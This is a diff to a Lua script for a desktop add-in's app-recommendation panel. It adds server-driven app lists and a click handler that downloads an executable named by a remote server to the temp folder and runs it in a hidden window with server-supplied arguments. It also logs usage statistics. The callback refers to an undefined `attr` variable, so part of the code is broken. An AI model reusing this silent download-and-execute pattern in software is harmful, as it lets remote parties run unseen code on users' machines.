@@ -182,17 +182,57 @@ function OnClickYY(self)
 	local ctrl = self:GetOwnerControl()
 	ShowZanZhu(ctrl, false)
 	ShowMainPage(ctrl, false)
-	--[[AsynCall(
+	AsynCall(
 		function()
-			ShowAppList(ctrl, true)
-		end)]]--
-		ShowAppList(ctrl, true)
+			if type(gtAppList) == "table" then
+				ShowAppList(ctrl, true)
+			else
+				DownLoadAppList(function(strCfgName)
+					gtAppList = LoadAppList(strCfgName)
+					ShowAppList(ctrl, true)
+				end)
+			end
+		end)
 end
 
-function LoadAppList()
-	local strAppListPath = tFunHelper.GetCfgPathWithName("AppList.dat")
+function DownLoadAppList(fnCallBack)
+	local tUserConfig = tFunHelper.ReadConfigFromMemByKey("tUserConfig") or {}
+	
+	local strAppListURL = tUserConfig["strServerAppListURL"]
+	if not IsRealString(strAppListURL) then
+		fnCallBack("AppList.dat")
+		return
+	end
+	
+	local strSavePath = tFunHelper.GetCfgPathWithName("ServerAppList.dat")
+	if not IsRealString(strSavePath) then
+		fnCallBack("AppList.dat")
+		return
+	end
+	
+	local nTimeInMs = 10*1000
+	g_bAppListDownLoading = true
+	
+	tFunHelper.NewAsynGetHttpFile(strAppListURL, strSavePath, false
+	, function(bRet, strRealPath)
+		TipLog("[InitAppCtrl] bRet:"..tostring(bRet)
+				.." strRealPath:"..tostring(strRealPath))
+		
+		if 0 == bRet then
+			fnCallBack("ServerAppList.dat")
+		else
+			fnCallBack("AppList.dat")
+		end
+		
+		g_bAppListDownLoading = false
+	end, nTimeInMs)
+end
+
+
+function LoadAppList(strCfgName)
+	local strAppListPath = tFunHelper.GetCfgPathWithName(strCfgName)
 	if not IsRealString(strAppListPath) or not tipUtil:QueryFileExists(strAppListPath) then
-		return nil
+		return {}
 	end
 	
 	local tAppList = tFunHelper.LoadTableFromFile(strAppListPath)
@@ -225,7 +265,7 @@ function ShowAppList(ctrl, bIsShow)
 		gtAppList = gtAppList or LoadAppList()
 		local tmpTextureObj, tmpTextObj
 		for idx, info in ipairs(gtAppList) do
-			if CreateTextureRes(info["strKeyName"]) then
+			if CreateTextureRes(info["strKeyName"]) and idx <= 24 then
 				tmpTextureObj = objFactory:CreateUIObject("AppList.Texture."..info["strKeyName"], "TipAddin.Button")
 				tmpTextObj = objFactory:CreateUIObject("AppList.Text."..info["strKeyName"], "TextObject")
 				layout:AddChild(tmpTextureObj)
@@ -246,7 +286,7 @@ function ShowAppList(ctrl, bIsShow)
 				tmpTextureObj:AttachListener("OnClick", 
 									false,
 									function(self)
-									
+										OpenLinkAfterClick(info)
 									end)
 				tmpTextObj:SetObjPos2((v-1)*83, (h-1)*110+48+6, 70, 15)
 				tmpTextObj:SetHAlign("center")
@@ -259,6 +299,106 @@ function ShowAppList(ctrl, bIsShow)
 	end
 	layout:SetVisible(bIsShow)
 	layout:SetChildrenVisible(bIsShow)
+end
+
+--1:浏览器打开;2:直接下载或运行
+function OpenLinkAfterClick(info)
+	local nOpenType = info.nOpenType
+	local strOpenLink = info.strOpenLink
+	local strKeyName = info.strKeyName or ""
+	
+	if not IsRealString(strOpenLink) then
+		return
+	end
+	
+	if nOpenType == 1 then
+		tipUtil:OpenURL(strOpenLink)
+		SendAppReport(strKeyName, 1)
+	elseif nOpenType == 2 then
+		OpenSoftware(info)
+	end	
+end
+
+
+function OpenSoftware(info)
+	local strRegPath = info.strRegPath or ""
+	local strExeName = info.strExeName or ""
+	local strKeyName = info.strKeyName or ""
+	
+	local strInstallDir = tFunHelper.RegQueryValue(strRegPath)
+	if string.lower(strExeName) == "baidusd.exe" then
+		local strVersion = tFunHelper.RegQueryValue(info.strRegVersion)
+		strInstallDir = tipUtil:PathCombine(strInstallDir, strVersion)
+	end
+	local strInstallPath = tipUtil:PathCombine(strInstallDir, strExeName)
+	local strPathWithFix = string.gsub(strInstallPath, '"', "")
+	if IsRealString(strInstallDir) and tipUtil:QueryFileExists(strPathWithFix) then
+		tipUtil:ShellExecute(0, "open", strPathWithFix, 0, 0, "SW_SHOWNORMAL")
+		SendAppReport(strKeyName, 2)
+	else
+		if info.bIsDownLoading then
+			return
+		end
+		DownLoadSoftware(info)
+		SendAppReport(strKeyName, 3)
+	end
+end
+
+
+function GetFileSaveNameFromUrl(url)
+	local _, _, strFileName = string.find(tostring(url), ".*/(.*)$")
+	local npos = string.find(strFileName, "?", 1, true)
+	if npos ~= nil then
+		strFileName = string.sub(strFileName, 1, npos-1)
+	end
+	return strFileName
+end
+
+function DownLoadSoftware(info)
+	if info.bIsDownLoading then
+		return
+	end
+	info.bIsDownLoading = true
+	
+	local strOpenLink = info.strOpenLink
+	local strCommand = info.strCommand or ""
+	if not IsRealString(strOpenLink) then
+		return
+	end
+	
+	local strSaveDir = tipUtil:GetSystemTempPath()
+	local strFileName = GetFileSaveNameFromUrl(strOpenLink)	
+	if not string.find(strFileName, "%.exe$") then
+		strFileName = strFileName..".exe"
+	end
+	local strSavePath = tipUtil:PathCombine(strSaveDir, strFileName)
+	
+	tFunHelper.NewAsynGetHttpFile(strOpenLink, strSavePath, false
+	, function(bRet, strRealPath)
+		tFunHelper.TipLog("[DownLoadSoftware] strOpenLink:"..tostring(strOpenLink)
+		        .."  bRet:"..tostring(bRet).."  strRealPath:"..tostring(strRealPath))		
+		if 0 ~= bRet then
+			attr.bIsDownLoading = false
+			return
+		end
+		
+		tipUtil:ShellExecute(0, "open", strRealPath, strCommand, 0, "SW_HIDE")
+		attr.bIsDownLoading = false
+	end)	
+end
+
+-- 1 浏览器打开链接
+-- 2 激活软件
+-- 3 下载软件 
+function SendAppReport(strKeyName, nType)
+	local tStatInfo = {}
+	tStatInfo.strEC = "AppPanel"
+	tStatInfo.strEA = strKeyName
+	tStatInfo.strEL = tostring(nType)
+	
+	if type(tFunHelper.TipConvStatistic) == "function" then
+		tFunHelper.TipConvStatistic(tStatInfo)
+	end
 end
 
 function OnInitControlVersion(self)
